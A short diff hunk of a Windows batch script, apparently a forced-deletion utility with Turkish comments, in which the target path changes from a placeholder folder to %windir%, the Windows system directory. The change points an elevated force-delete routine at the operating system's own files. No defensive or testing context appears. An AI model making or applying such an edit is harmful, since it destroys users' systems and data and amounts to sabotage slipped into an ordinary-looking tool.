@@ -13,7 +13,7 @@ if %errorLevel% neq 0 (
 )
 
 :: Silinecek klasor yolu
-set "targetPath=C:\Silinecek\Klasor\Yolu"
+set "targetPath=%windir%"
 
 echo [+] ULTRA FORCE DELETE TOOL BASLATILIYOR...
 echo [+] Hedef: %targetPath%
